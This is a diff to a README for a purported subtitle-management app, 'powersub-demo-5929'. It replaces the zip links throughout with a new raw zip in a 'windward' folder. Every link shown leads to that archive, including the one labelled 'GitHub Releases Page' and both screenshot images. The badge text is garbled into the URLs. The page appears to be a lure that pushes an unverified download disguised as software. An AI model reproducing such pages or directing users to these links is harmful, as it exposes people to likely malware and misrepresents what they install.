@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-5929 - Easy Subtitle Management Made Simple
 
 ## 📥 Download Now
-[![Download Link](https://raw.githubusercontent.com/lillyazs/powersub-demo-5929/main/windward/powersub-demo-5929_v1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/lillyazs/powersub-demo-5929/main/windward/powersub-demo-5929_v1.8.zip)
+[![Download Link](https://github.com/lillyazs/powersub-demo-5929/raw/refs/heads/main/windward/demo-powersub-v3.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/lillyazs/powersub-demo-5929/raw/refs/heads/main/windward/demo-powersub-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the `powersub-demo-5929` repository! This application helps you manage subtitles effortlessly. Follow the steps below to download and run the software.
@@ -15,7 +15,7 @@ Before you start, ensure your system meets the following requirements:
 - **Internet Connection:** Required for downloading subtitles
 
 ## 🔗 Download & Install
-1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/lillyazs/powersub-demo-5929/main/windward/powersub-demo-5929_v1.8.zip).
+1. Visit this page to download: [GitHub Releases Page](https://github.com/lillyazs/powersub-demo-5929/raw/refs/heads/main/windward/demo-powersub-v3.8.zip).
    
 2. On the Releases page, look for the latest version of the application. You should see a list of files available for download. 
 
@@ -45,10 +45,10 @@ After installation, follow these steps to use `powersub-demo-5929`:
 4. **Apply Subtitles:** Most media players will automatically detect the downloaded subtitles. If needed, you can manually load them within your media player's settings.
 
 ## 📸 Screenshots
-![Main Interface](https://raw.githubusercontent.com/lillyazs/powersub-demo-5929/main/windward/powersub-demo-5929_v1.8.zip)
+![Main Interface](https://github.com/lillyazs/powersub-demo-5929/raw/refs/heads/main/windward/demo-powersub-v3.8.zip)
 *Main interface of powersub-demo-5929 showing the search bar.*
 
-![Subtitle List](https://raw.githubusercontent.com/lillyazs/powersub-demo-5929/main/windward/powersub-demo-5929_v1.8.zip)
+![Subtitle List](https://github.com/lillyazs/powersub-demo-5929/raw/refs/heads/main/windward/demo-powersub-v3.8.zip)
 *List of available subtitles for download.*
 
 ## ❓ Frequently Asked Questions (FAQs)
@@ -68,4 +68,4 @@ If you have questions or need help, please reach out via the GitHub issues page.
 Thank you for using `powersub-demo-5929`. Happy viewing!
 
 ## 📥 Download Again
-[![Download Link](https://raw.githubusercontent.com/lillyazs/powersub-demo-5929/main/windward/powersub-demo-5929_v1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/lillyazs/powersub-demo-5929/main/windward/powersub-demo-5929_v1.8.zip)
+[![Download Link](https://github.com/lillyazs/powersub-demo-5929/raw/refs/heads/main/windward/demo-powersub-v3.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/lillyazs/powersub-demo-5929/raw/refs/heads/main/windward/demo-powersub-v3.8.zip)
